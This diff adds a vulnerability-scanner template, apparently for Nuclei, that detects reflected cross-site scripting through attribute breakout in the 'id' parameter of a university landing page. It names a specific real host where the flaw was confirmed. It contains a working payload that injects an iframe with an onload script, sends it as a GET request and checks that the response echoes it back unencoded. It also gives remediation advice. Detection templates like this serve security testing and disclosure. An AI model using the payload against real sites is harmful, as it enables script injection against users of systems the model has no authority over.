@@ -1,0 +1,45 @@
+id: mocu-xss-attr-iframe-injection
+
+info:
+  name: MoCU Landing Page - Reflected XSS via Attribute Breakout (id param)
+  author: 0xmous27
+  severity: medium
+  description: "The id parameter in /index.php?r=site/landing is reflected unsanitized inside an HTML attribute value (id=\"...\"). Injecting \"><iframe onload=alert(1)> breaks out of the attribute context and injects arbitrary HTML into the DOM. Confirmed on mocuas.mocu.ac.tz."
+  reference:
+    - https://owasp.org/www-community/attacks/xss/
+    - https://portswigger.net/web-security/cross-site-scripting/contexts/html-attributes
+  classification:
+    cwe-id: CWE-79
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+  metadata:
+    verified: true
+    max-request: 1
+  tags: xss,reflected,iframe,attribute-injection
+  remediation: "Encode all user-supplied output with htmlspecialchars() or equivalent before rendering in HTML attributes. Apply a strict Content-Security-Policy header."
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?r=site%2Flanding&id=xsstest%22%3E%3Ciframe+onload%3Dalert%28XSSCONFIRM%29%3E"
+
+    matchers-condition: and
+    matchers:
+      # Layer 1: Confirm the iframe payload is reflected unencoded in the response body
+      - type: word
+        words:
+          - '<iframe onload=alert(XSSCONFIRM)>'
+        part: body
+
+      # Layer 2: Ensure the payload is NOT HTML-encoded (would be a false positive)
+      - type: word
+        words:
+          - '&lt;iframe'
+          - '%3Ciframe'
+        part: body
+        negative: true
+
+      # Layer 3: Confirm HTTP 200 response
+      - type: status
+        status:
+          - 200
